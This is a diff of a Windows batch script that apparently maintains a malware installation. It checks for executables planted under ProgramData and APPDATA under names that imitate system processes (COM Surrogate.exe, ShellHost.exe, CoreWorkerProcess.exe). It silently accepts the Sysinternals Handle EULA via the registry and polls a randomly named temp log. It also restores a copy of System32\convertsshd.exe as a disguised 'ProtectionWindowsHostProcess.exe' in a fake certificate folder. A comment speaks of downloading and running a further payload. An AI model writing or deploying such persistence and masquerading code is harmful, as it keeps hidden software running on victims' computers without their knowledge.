@@ -19,7 +19,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 set "RUNEVERYOFFICIALMD5=18b2ef86ad6a29d3436817b09bbc9ad8"
 
 
-
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
 
@@ -113,26 +112,128 @@ goto :EOF
 :: Your long batch script starts here
 echo Starting LogOutput...
 echo.
+echo.
+echo.
+
+
+
+
+
+
+
+
+:: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 
+
+:: Define the list of files to check
+set "file1=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
+set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+set "file4=%APPDATA%\Microsoft\nircmd.exe"
+set "file5=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+set "file6=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+set "file7=%APPDATA%\Microsoft\7z.exe"
+set "file8=%APPDATA%\Microsoft\7z.dll"
+set "file9=%SystemRoot%\System32\handle.exe"
+set "file10=%SystemRoot%\System32\wudtest.exe"
+
+
+echo Typing in 
+echo.
+echo.
+
+if exist "%file1%" echo COM Surrogate.exe Found in %file1%
+if exist "%file2%" echo ShellHost.exe Found in %file2%
+if exist "%file3%" echo KMSAuto.exe Found in %file3%
+if exist "%file4%" echo nircmd.exe Found in %file4%
+if exist "%file5%" echo CoreWorkerProcess.exe Found in %file5%
+::if exist "%file6%" echo STLRRUNNERCALLER.exe Found in %file6%
+if exist "%file7%" if exist "%file8%" (
+    echo 7z.exe and 7z.dll Found in %file7% and %file8%
+) else (
+    if exist "%file7%" echo 7z.exe Found in %file7%
+    if exist "%file8%" echo 7z.dll Found in %file8%
+)
+if exist "%file9%" echo handle.exe Found in %file9%
+if exist "%file10%" echo wudtest.exe SpeedTest Found in %file10%
+
+
+
+set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
+
+
+
+
+
+:: Loop 6 times with 20-second interval
+for /L %%i in (1,1,6) do (
+    echo [%%i] Running handler...
+    call :HANDLERUNEVERYLOG
+    if %%i lss 6 timeout /t 20 /nobreak
+)
+echo.
+echo.
+echo.
+echo.
+goto CHECKRUNEVERY
+
+
+
+
+:HANDLERUNEVERYLOG
+
+echo Trying Handle RunEvery Log.
+echo.
+
+
+:: Find processes locking the file
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
+reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
+echo Handle LOGFILE TA3 RUNEVERY
+handle.exe "%LOGFILE%"
+echo.
+echo.
+echo.
+
+
+goto :EOF
+
+
 
 
 
 
 :CHECKRUNEVERY
-
-if not exist "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks" mkdir "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
-::mkdir "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
-
-:: Define the paths
+echo CHECKRUNEVERY
+echo.
+echo.
+:: Define the folder and file paths
+set "targetFolder=%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
 set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
-set "startupFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
 
-:: Check if the file exists in the Startup folder
-if not exist "%startupFile%" (
-    echo File not found in Startup folder. Restoring...
-    copy "%sourceFile%" "%startupFile%"
-) else (
-    echo File is already in Startup folder.
+:: Ensure the folder exists
+if not exist "%targetFolder%" (
+    echo Creating folder: "%targetFolder%"
+    mkdir "%targetFolder%"
 )
+
+:: Check if the target file exists
+if not exist "%startupFile%" (
+    echo File not found: "%startupFile%"
+    echo Restoring from "%sourceFile%"...
+    copy /Y "%sourceFile%" "%startupFile%" >nul
+    if exist "%startupFile%" (
+        echo File restored successfully.
+    ) else (
+        echo Failed to copy file.
+    )
+) else (
+    echo File already exists: "%startupFile%"
+)
+
+echo.
+echo.
 
 
 ::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
